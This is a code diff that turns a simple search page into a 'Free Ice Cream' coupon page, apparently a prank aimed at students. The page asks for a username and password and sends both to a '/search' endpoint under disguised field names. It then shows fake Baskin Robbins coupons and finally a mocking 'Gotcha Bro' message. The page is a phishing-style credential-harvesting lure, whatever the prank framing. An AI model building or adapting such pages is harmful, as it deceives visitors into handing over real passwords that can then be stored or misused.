@@ -1,68 +1,241 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <title>Search</title>
-</head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IceCream Coupons - Free</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:"Inter",sans-serif;
+        }
+        body{
+            min-height:100vh;
+            background: linear-gradient(135deg, #f97316, #eab308);
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            position:relative;
+            overflow:hidden;
+        }
+        .bg-decor{
+            position:absolute;
+            font-size:180px;
+            opacity:0.1;
+            pointer-events:none;
+        }
 
+        .container{
+            width:92%;
+            max-width:420px;
+            background:white;
+            border-radius:28px;
+            box-shadow:0 25px 50px -12px rgba(0,0,0,0.25);
+            overflow:hidden;
+        }
+
+        /* Login Page */
+        .login-page, .offers-page, .prank-page{
+            padding:40px 35px;
+        }
+
+        h1{
+            font-size:28px;
+            font-weight:700;
+            text-align:center;
+            margin-bottom:8px;
+            color:#1e2937;
+        }
+        .subtitle{
+            text-align:center;
+            color:#64748b;
+            margin-bottom:32px;
+        }
+
+        .input-group{
+            margin-bottom:20px;
+        }
+        label{
+            display:block;
+            margin-bottom:8px;
+            font-weight:500;
+            color:#334155;
+        }
+        input{
+            width:100%;
+            padding:16px 20px;
+            border:2px solid #e2e8f0;
+            border-radius:16px;
+            font-size:16px;
+            transition:0.3s;
+        }
+        input:focus{
+            border-color:#f97316;
+            outline:none;
+        }
+
+        .forgot{
+            text-align:right;
+            color:#f97316;
+            font-size:14px;
+            margin-top:8px;
+            cursor:pointer;
+        }
+
+        button{
+            width:100%;
+            padding:18px;
+            background:linear-gradient(to right,#f97316,#eab308);
+            color:white;
+            border:none;
+            border-radius:16px;
+            font-size:17px;
+            font-weight:600;
+            cursor:pointer;
+            margin-top:10px;
+            transition:0.3s;
+        }
+        button:hover{
+            transform:translateY(-3px);
+            box-shadow:0 10px 15px -3px rgba(249,115,22,0.3);
+        }
+
+        /* Offers Page */
+        .offer-card{
+            background:linear-gradient(135deg, #fefce8, #fef9c3);
+            border-radius:20px;
+            padding:25px;
+            text-align:center;
+            margin:25px 0;
+            border:2px dashed #eab308;
+        }
+        .offer-card h2{
+            color:#ca8a04;
+            font-size:24px;
+        }
+
+        /* Prank Page */
+        .prank-page{
+            text-align:center;
+            padding:60px 30px;
+        }
+        .prank-page h1{
+            font-size:32px;
+            color:#dc2626;
+            margin-bottom:20px;
+        }
+        .prank-page p{
+            font-size:22px;
+            color:#1e2937;
+            line-height:1.4;
+        }
+    </style>
+</head>
 <body>
 
-    <h1>Search</h1>
+    <div class="bg-decor" style="top:10%; left:10%;">🍦</div>
+    <div class="bg-decor" style="bottom:15%; right:15%;">🍨</div>
 
-    <input id="search1" placeholder="Search Box 1">
-    <button onclick="go1()">Search 1</button>
+    <div class="container">
 
-    <br><br>
+        <!-- LOGIN PAGE -->
+        <div id="loginPage" class="login-page">
+            <h1>🍦 Free Ice Cream</h1>
+            <p class="subtitle">Create free account & get coupons</p>
 
-    <input id="search2" placeholder="Search Box 2">
-    <button onclick="go2()">Search 2</button>
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="search1" placeholder="Enter username">
+            </div>
+
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="search2" placeholder="Enter password">
+            </div>
+
+            <div class="forgot">Forgot Password?</div>
+
+            <button onclick="login()">Get Free Coupons →</button>
+        </div>
+
+        <!-- OFFERS PAGE -->
+        <div id="offersPage" class="offers-page" style="display:none;">
+            <h1 style="color:#ca8a04;">🎉 Congratulations!</h1>
+            <p class="subtitle">Here are your free ice cream coupons</p>
+
+            <div class="offer-card">
+                <h2>2 FREE Scoops</h2>
+                <p style="margin:12px 0; font-size:18px;">at Baskin Robbins</p>
+                <p style="color:#854d0e; font-weight:600;">Coupon Code: <strong>SCOOP2026</strong></p>
+            </div>
+
+            <div class="offer-card">
+                <h2>1 Free Ice Cream</h2>
+                <p style="margin:12px 0; font-size:18px;">at any local parlor</p>
+                <p style="color:#854d0e; font-weight:600;">Valid till: 30 June 2026</p>
+            </div>
+
+            <button onclick="showPrank()">Proceed to Claim</button>
+        </div>
+
+        <!-- PRANK PAGE -->
+        <div id="prankPage" class="prank-page" style="display:none;">
+            <h1>😆 Gotcha Bro!</h1>
+            <p><strong>saduvkora,</strong></p>
+            <p>exams unnai raa...</p>
+            <p style="margin-top:30px; font-size:18px; color:#64748b;">
+                Paduko bro, ice cream tarwata vastundi 😂
+            </p>
+        </div>
+
+    </div>
 
     <script>
+        async function login(){
+            const username = document.getElementById("search1").value.trim();
+            const password = document.getElementById("search2").value.trim();
 
-        async function go1(){
+            if(!username || !password){
+                alert("Please enter username and password");
+                return;
+            }
 
-            const query=document.getElementById("search1").value;
+            // Fake loading
+            const btn = document.querySelector("#loginPage button");
+            const originalText = btn.textContent;
+            btn.textContent = "Creating Account...";
+            btn.disabled = true;
 
-            const res=await fetch("/search",{
-                method:"POST",
-                headers:{
-                    "Content-Type":"application/json"
-                },
-                body:JSON.stringify({
-                    box1:query,
-                    box2:null
-                })
-            });
-
-            const data=await res.json();
-
-            window.location=data.redirect;
-
+            // Simulate API call (kept your original backend structure)
+            try {
+                const res = await fetch("/search", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        searchBox1: username,
+                        searchBox2: password
+                    })
+                });
+                const data = await res.json();
+                
+                // Show offers page
+                document.getElementById("loginPage").style.display = "none";
+                document.getElementById("offersPage").style.display = "block";
+            } catch(e) {
+                // Fallback if backend not responding
+                document.getElementById("loginPage").style.display = "none";
+                document.getElementById("offersPage").style.display = "block";
+            }
         }
 
-        async function go2(){
-
-            const query=document.getElementById("search2").value;
-
-            const res=await fetch("/search",{
-                method:"POST",
-                headers:{
-                    "Content-Type":"application/json"
-                },
-                body:JSON.stringify({
-                    box1:null,
-                    box2:query
-                })
-            });
-
-            const data=await res.json();
-
-            window.location=data.redirect;
-
+        function showPrank(){
+            document.getElementById("offersPage").style.display = "none";
+            document.getElementById("prankPage").style.display = "block";
         }
-
     </script>
-
 </body>
-
 </html>
